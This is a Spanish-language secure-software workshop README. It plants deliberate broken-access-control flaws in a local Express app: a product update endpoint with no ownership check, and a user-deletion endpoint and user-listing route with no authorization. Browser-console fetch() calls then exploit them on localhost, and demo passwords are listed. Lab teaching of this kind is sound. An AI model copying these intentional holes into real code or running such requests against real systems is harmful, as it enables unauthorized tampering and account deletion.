# Taller_3_Software_seguro
Presentación del taller 3, Desarrollo de Software Seguro, elaborado por **Jonathan Martelo**

---

## Escenario de vulnerabilidad 1

Se procede a modificar el código de **`products.js`** colocando el siguiente código en el componente de actualización:

```javascript
// Actualizar producto
// Reemplazar el endpoint PUT en backend/routes/products.js con este código vulnerable
router.put('/:id', verifyToken, (req, res) => {
 const { name, description } = req.body;
 const productId = req.params.id;

 // ¡VULNERABILIDAD! No se verifica si el usuario autenticado (req.user.id)
 // es el propietario del producto (productId).
 // Cualquier usuario autenticado puede modificar cualquier producto si conoce su ID.
 const updateSql = 'UPDATE products SET name =?, description =? WHERE id =?';
 db.run(updateSql, [name, description, productId], function(err) {
   if (err) {
     return res.status(500).json({ error: err.message });
   }
   if (this.changes === 0) {
     return res.status(404).json({ error: 'Producto no encontrado.' });
   }
   res.json({ message: 'Producto actualizado con éxito (¡inseguro!).' });
 });
});
```

Posteriormente se siguen los siguientes pasos:

1. Reiniciar el backend precionando `Ctrl + c` y se ejecuta el comando:

   ```bash
   node server.js
   ```

2. Iniciar sesión con las siguientes credenciales:

   | username | password            |
   |----------|---------------------|
   | admin    | admin_password_123  |

3. Acceder a la consola del navegador presionando la tecla **F12**.

4. Ejecutar los siguientes comandos:

   - **Comando**  
     *Allow paste* (en caso de que el navegador no permita pegar el código a copiar).

   - **Comando principal**  

     ```javascript
     fetch('http://localhost:3000/api/products/1', {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json'
       },
       credentials: 'include', // Envía la cookie de sesión del admin
       body: JSON.stringify({
         name: 'Producto Hackeado',
         description: 'Este producto ha sido modificado por otro usuario.'
       })
     })
     .then(res => res.json())
     .then(data => console.log(data));
     ```

5. Recargar la página e ingresar nuevamente con el perfil de **admin**.

Con estos pasos debería aparecer un producto con la siguiente información:

> **Producto Hackeado**  
> **Este producto ha sido modificado por otro usuario.**  
> **Propietario: user**

---

## Escenario de vulnerabilidad 2

Para este escenario no se modifica un codigo sino que se crea el documento **`users.js`** con el siguiente codigo 

```javascript
// Archivo: backend/routes/users.js
const express = require('express');
const router = express.Router();
const db = require('../database/database');
const { verifyToken } = require('../middleware/authMiddleware');

// Endpoint para eliminar un usuario (vulnerable a escalada de privilegios)
router.delete('/:id', verifyToken, (req, res) => {
  const userIdToDelete = req.params.id;

  // Aquí pasamos el parámetro userIdToDelete como segundo argumento
  const sql = 'DELETE FROM users WHERE id = ?';
  db.run(sql, [userIdToDelete], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    if (this.changes === 0) {
      return res.status(404).json({ error: 'Usuario no encontrado.' });
    }
    res.json({ message: `Usuario con ID ${userIdToDelete} eliminado con éxito.` });
  });
});

module.exports = router;

//Update, este es un codigo para hacer un select en la lista user, con este podremos ver realmente el id a eliminar con el ataque del codigo vulnerable
//Podremos hacer el select visitando el link http://localhost:3000/api/users

router.get('/', (req, res) => {
  db.all('SELECT id, username, role FROM users', [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

```

Posteriormente se siguen los siguientes pasos:

1. Reiniciar el backend precionando `Ctrl + c` y se ejecuta el comando:

   ```bash
   node server.js
   ```

2. Iniciar sesión con las siguientes credenciales:

   | username | password            |
   |----------|---------------------|
   | user     |  user_password_123  |

3. Acceder a la consola del navegador presionando la tecla **F12**.

4. Acceder al link **`http://localhost:3000/api/users`** y valida los usuarios disponibles, deberia de verse una pequeña lista con 2 usuarios, anota o toma el usuario que vamos a eliminar, deberia de imprimir el siguiente resultado 

>[
>   {
>    "id": 1,
>    "username": "admin",
>    "role": "admin"
>  },
>  {
>    "id": 2,
>    "username": "user",
>    "role": "user"
>  }
>]

5. Ejecutar los siguientes comandos:

   - **Comando**  
     *Allow paste* (en caso de que el navegador no permita pegar el código a copiar).

   - **Comando principal**  

     ```javascript
     fetch('http://localhost:3000/api/users/1', {
      method: 'DELETE',
      credentials: 'include' // Envía la cookie de sesión del 'user'
     })
     .then(res => res.json())
     .then(data => console.log(data));
     ```

6. Recargar la página e ingresar nuevamente con el perfil de **admin**.

Con estos pasos debería de generar fallo ya que el usuario **admin** ya no existe, para validar correctamente que este haya sido eliminado tenemos que visitar nuevamente el link **`http://localhost:3000/api/users`** y ahora vera este resultado 

>[
>  {
>    "id": 2,
>    "username": "user",
>    "role": "user"
>  }
>]

